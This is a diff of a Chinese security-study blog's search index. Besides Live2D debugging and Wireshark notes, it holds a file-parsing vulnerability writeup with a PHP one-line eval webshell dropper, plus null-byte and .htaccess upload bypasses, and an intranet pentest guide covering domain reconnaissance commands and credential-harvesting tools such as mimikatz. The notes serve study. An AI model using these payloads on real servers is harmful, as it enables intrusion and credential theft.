-    <url>/2022/01/10/study-3/</url>
-    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
-<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
-<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
-<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
-<p>比如：</p>
-<p><img src="/2022/01/10/study-3/1.png" alt></p>
-<p><img src="/2022/01/10/study-3/2.png" alt></p>
-<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
-<span id="more"></span>
-<hr>
-<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
-<p>看着这些404 not found 我觉得很大可能是路径问题</p>
-<p>加上很多文章也说路径问题</p>
-<p>于是进行了修改：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>更改后：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
-<p>于是我改成绝对路径：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
-<p>请求网址变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>你说这是什么道理（无奈）</p>
-<hr>
-<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
-<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
-<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP反序列化</title>
     <url>/2022/03/26/unserialize/</url>
     <content><![CDATA[<h1 id="一、什么是反序列化？"><a href="#一、什么是反序列化？" class="headerlink" title="一、什么是反序列化？"></a>一、什么是反序列化？</h1><p>首先我们要知道什么是序列化，我们在php里定义一个class，这个class里存储着一些变量和数据，如果这个class一直不销毁，就会浪费系统资源，在一些大型项目里可能就会产生问题，因此，我们可以把这个对象<strong>序列化</strong>(serialize)，以<strong>字符串</strong>的形式存储起来，当需要用的时候再将它进行<strong>反序列化</strong>(unserialize)回来就可以了。</p>
@@ -2774,6 +2730,50 @@
       </tags>
   </entry>
   <entry>
+    <title>Failed to load resource</title>
+    <url>/2022/01/10/study-3/</url>
+    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
+<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
+<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
+<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
+<p>比如：</p>
+<p><img src="/2022/01/10/study-3/1.png" alt></p>
+<p><img src="/2022/01/10/study-3/2.png" alt></p>
+<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
+<span id="more"></span>
+<hr>
+<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
+<p>看着这些404 not found 我觉得很大可能是路径问题</p>
+<p>加上很多文章也说路径问题</p>
+<p>于是进行了修改：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>更改后：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
+<p>于是我改成绝对路径：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
+<p>请求网址变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>你说这是什么道理（无奈）</p>
+<hr>
+<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
+<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
+<hr>
+<p>参考：</p>
+<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
+<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>.htaccess文件上传漏洞</title>
     <url>/2022/01/09/upload-1/</url>
     <content><![CDATA[<p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404页面、改文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
@@ -2785,60 +2785,6 @@
 <li>如果存在修改<code>.htaccess</code>文件权限，修改解析规则</li>
 </ol>
 <h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解析漏洞</title>
-    <url>/2022/01/09/upload/</url>
-    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
-<ol>
-<li><p><strong>目录解析</strong></p>
-<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
-</li>
-<li><p><strong>文件解析</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
-<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
-<li><p><strong>影响版本</strong>:</p>
-<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>Nginx在图片中嵌入php代码然后通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
-<p>来执行其中的代码</p>
-</li>
-</ol>
-<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
-<li><p><strong>背景</strong></p>
-<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
-</li>
-<li><p><strong>利用</strong></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
-</li>
-</ol>
-<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
-<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
-</li>
-<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
-</li>
-</ol>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -2929,6 +2875,60 @@
       </tags>
   </entry>
   <entry>
+    <title>解析漏洞</title>
+    <url>/2022/01/09/upload/</url>
+    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
+<ol>
+<li><p><strong>目录解析</strong></p>
+<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
+</li>
+<li><p><strong>文件解析</strong></p>
+<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
+<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
+<li><p><strong>影响版本</strong>:</p>
+<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>Nginx在图片中嵌入php代码然后通过访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
+<p>来执行其中的代码</p>
+</li>
+</ol>
+<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
+<li><p><strong>背景</strong></p>
+<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
+</li>
+</ol>
+<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
+<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
+</li>
+<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS各种绕过姿势</title>
     <url>/2022/03/19/xss/</url>
     <content><![CDATA[<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h2><p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
@@ -2970,6 +2970,196 @@
       <tags>
         <tag>web</tag>
         <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>传输文件还原</title>
+    <url>/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/</url>
+    <content><![CDATA[<h1 id="一、配置环境"><a href="#一、配置环境" class="headerlink" title="一、配置环境"></a>一、配置环境</h1><p>将手机和PC连到同一子网下（如GUET-WiFi）</p>
+<p>手机IP：<code>10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/1.png" alt></p>
+<p>PC的IP：<code>10.33.35.83</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/2.png" alt></p>
+<h1 id="二、WireShark抓包"><a href="#二、WireShark抓包" class="headerlink" title="二、WireShark抓包"></a>二、WireShark抓包</h1><p>打开WireShark，选择WLAN过滤器</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/3.png" alt></p>
+<p>然后在过滤出resource IP是手机IP的数据包：<code>ip.src == 10.33.80.238</code></p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/4.png" alt></p>
+<p>通过QQ从手机发送一张图片给PC，此时WireShark会截获大量数据包，找到其中一个是HTTP协议的数据包</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/5.png" alt></p>
+<p>右键单击然后选择追踪TCP流</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/6.png" alt></p>
+<p>然后在下面展示数据的格式中选择原始数据（raw data）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/7.png" alt></p>
+<p>然后将这些原始数据另存为一个新文件即可</p>
+<h1 id="三、还原文件"><a href="#三、还原文件" class="headerlink" title="三、还原文件"></a>三、还原文件</h1><p>用十六进制编辑器（010 Editor）打开该文件，找到图片的十六进制文件头（FFD8FF）</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/8.png" alt></p>
+<p>然后删除该文件头之前的所有数据</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/9.png" alt></p>
+<p>然后保存，修改文件后缀名为图片格式（jpg）即可成功打开该图片</p>
+<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/10.png" alt></p>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网安全</title>
+    <url>/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h1 id="一、基本理论知识"><a href="#一、基本理论知识" class="headerlink" title="一、基本理论知识"></a>一、基本理论知识</h1><h2 id="隔离区（DMZ）"><a href="#隔离区（DMZ）" class="headerlink" title="隔离区（DMZ）"></a>隔离区（DMZ）</h2><p>两个防火墙之间，为了解决安装防火墙后<strong>外部网络用户</strong>不能访问<strong>内部网络服务器</strong>的问题，而设立的一个非安全系统与 安全系统之间的缓冲区。</p>
+<p>该缓冲区位于企业<strong>内部网络</strong>和<strong>外部网络</strong>之间的小网络区域内。放置一些必须<strong>公开的服务器设施</strong>，如企业Web服务器（<strong>攻击点</strong>） 、FTP服务器 和论坛等。</p>
+<p>有一些web服务器也放在内网，这样更加危险。</p>
+<p>另一方面，通过这样一个DMZ区域，更加有效地保护内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
+<h2 id="工作组-amp-域环境"><a href="#工作组-amp-域环境" class="headerlink" title="工作组&amp;域环境"></a>工作组&amp;域环境</h2><p>工作组：地位平等，管理分散，<strong>没有集中管理</strong>。（范围小的计算机在局域网内）</p>
+<p>域环境：地位不平等，管理集中，<strong>实现集中管理</strong>。（共享文件，不需要每台计算机去配置用户进行访问，可以直接访问）</p>
+<p>域环境也可以简单的理解为工作组的升级版，更好管理。</p>
+<p>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同。</p>
+<p>工作组中的攻击手法如<strong>DNS劫持</strong>、<strong>ARP欺骗</strong>在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</p>
+<h2 id="域控制器DC"><a href="#域控制器DC" class="headerlink" title="域控制器DC"></a>域控制器DC</h2><p>域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器（这里面dc就是域控制器）</p>
+<h2 id="AD活动目录"><a href="#AD活动目录" class="headerlink" title="AD活动目录"></a>AD活动目录</h2><p>是微软所提供的<strong>目录服务</strong>（查询，身份验证）,活动目录的核心包含了<strong>活动目录数据库</strong>。</p>
+<p>在活动目录数据库中包含了<strong>域中所有的对象</strong>（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server 以及Windows Datacenter Server的目录服务。</p>
+<p>Active Directory储存了有关<strong>网络对象</strong>的信息，并且让<strong>管理员和用户</strong>能够轻松的<strong>查找和使用</strong>这些信息。</p>
+<h2 id="Linux域渗透问题"><a href="#Linux域渗透问题" class="headerlink" title="Linux域渗透问题"></a>Linux域渗透问题</h2><p>AD域控制器只在windows server系统能做吗？Linux可以吗？</p>
+<p>linux上也有相应的<strong>活动目录</strong>的，不过要装<strong>LDAP</strong>环境，一般企很少会用LDAP来管理的，因为<strong>功能上不及域强大</strong>，而且用linux来管理的话要求技术人员门槛也比较高，Linux还是比较<strong>适合做服务器</strong>好一点。</p>
+<blockquote>
+<p>（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如<strong>域内有Linux的操作系统</strong>，有Linux的服务器也行，只是很少）</p>
+</blockquote>
+<h2 id="局域网技术适用问题"><a href="#局域网技术适用问题" class="headerlink" title="局域网技术适用问题"></a>局域网技术适用问题</h2><p>不同的<strong>攻击技术手段适用面</strong>不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</p>
+<h2 id="内网安全流程"><a href="#内网安全流程" class="headerlink" title="内网安全流程"></a>内网安全流程</h2><p>熟悉基础概念-<strong>信息收集</strong>-后续<strong>探针</strong>-<strong>权限提升</strong>-<strong>横向渗透</strong>-<strong>权限维持</strong></p>
+<h1 id="二、实战操作"><a href="#二、实战操作" class="headerlink" title="二、实战操作"></a>二、实战操作</h1><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p>
+<ol>
+<li><strong>systeminfo</strong> //详细信息</li>
+<li><strong>net start</strong>  //启动服务</li>
+<li><strong>tasklist</strong>   //进程列表</li>
+<li><strong>schtasks</strong>   //计划任务</li>
+</ol>
+<h3 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h3><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p>
+<ol>
+<li><p><strong>ipconfig /all</strong>    //判断存在域-dns</p>
+</li>
+<li><p><strong>net view /domain</strong>    //判断存在域，若存在域，会显示出当前域</p>
+</li>
+<li><p><strong>net time /domain</strong>    //判断主域（域控），会返回域控的计算机全名</p>
+<blockquote>
+<p>因为域成员计算机的时间一般会以域控制器为准，所以当执行net time /domain命令时，该计算机会去域控获取时间</p>
+</blockquote>
+</li>
+<li><p><strong>netstat -ano</strong>    //当前网络端口开放</p>
+</li>
+<li><p><strong>nslookup</strong>    //追踪来源地址，获取域控的IP地址（ping命令也可以）</p>
+</li>
+</ol>
+<h3 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h3><p>旨在了解当前计算机或域环境下的<strong>用户及用户组信息</strong>，便于后期<strong>利用凭据</strong>进行测试<br>系统默认常见用户身份：</p>
+<ol>
+<li><strong>Domain Admins</strong>：域管理员（默认对域控制器有完全控制权）</li>
+<li>Domain Computers：域内机器</li>
+<li><strong>Domain Controllers</strong>：域控制器</li>
+<li>Domain Guest：域访客，权限低</li>
+<li>Domain Users：域用户</li>
+<li>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</li>
+</ol>
+<p>相关用户收集操作命令：</p>
+<ol>
+<li>net config workstation  //登录信息</li>
+<li>net user   //本地用户</li>
+<li>net localgroup   //本地用户组</li>
+<li>net user /domain   //获取域用户信息</li>
+<li>net goup /domain   //获取域用户组信息</li>
+<li>wmic useraccount get /all   //涉及域用户详细信息</li>
+<li>net group “Domain Admins” /domain   //查询域管理员账户</li>
+<li>net group “Enterprise Admins” /domain   //查询管理员用户组</li>
+<li>net group “Domain Controllers” /domain   //查询域控制器</li>
+<li>…</li>
+</ol>
+<h3 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h3><p>旨在收集各种密文，明文，口令等，为后续<strong>横向渗透</strong>做好测试准备</p>
+<p>计算机用户密码 HASH、明文获取：<strong>mimikatz</strong>(Windows)，<strong>mimipenguin</strong>(Linux)</p>
+<blockquote>
+<p>如果直接在Webserver的webadmin用户运行会报错（mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够）</p>
+</blockquote>
+<p> 计算机各种协议服务口令获取：<strong>LaZagne</strong>(all)，<strong>XenArmor</strong>(Windows)</p>
+<p>这两个软件主要是通过自动化翻找以下内容，从而获取凭据</p>
+<ol>
+<li>站点源码备份文件、数据库备份文件等</li>
+<li><p>各类数据库 Web 管理入口，如 PHPMyAdmin</p>
+</li>
+<li><p>浏览器保存密码、浏览器 Cookies</p>
+</li>
+<li><p>其他用户会话、3389 和 ipc$连接记录、回收站内容</p>
+</li>
+<li><p>Windows 保存的 WIFI 密码</p>
+</li>
+<li><p>网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等探针主机域控架构服务操作演示</p>
+</li>
+</ol>
+<h3 id="探针主机域控架构服务"><a href="#探针主机域控架构服务" class="headerlink" title="探针主机域控架构服务"></a>探针主机域控架构服务</h3><p>为后续横向思路做准备，针对应用，协议等各类攻击手法（探针域内主机角色及服务信息，利用开放端口服务及计算机名判断）</p>
+<h4 id="探针域控制器名及地址信息"><a href="#探针域控制器名及地址信息" class="headerlink" title="探针域控制器名及地址信息"></a>探针域控制器名及地址信息</h4><ol>
+<li><p>net time /domain</p>
+</li>
+<li><p>nslookup</p>
+</li>
+<li>ping</li>
+</ol>
+<h4 id="探针域内存活（在线）主机及地址信息"><a href="#探针域内存活（在线）主机及地址信息" class="headerlink" title="探针域内存活（在线）主机及地址信息"></a>探针域内存活（在线）主机及地址信息</h4><p>nbtscan 192.168.3.0/24 第三方工具（类似于nmap，可能需要做免杀，不推荐）</p>
+<p><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</code>（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截）</p>
+<p>其它探针方式如：nmap（易拦截）、masscan、第三方PowerShell脚本（windows的脚本开发语言）、<strong>nishang</strong>（推荐）、empire（推荐）等</p>
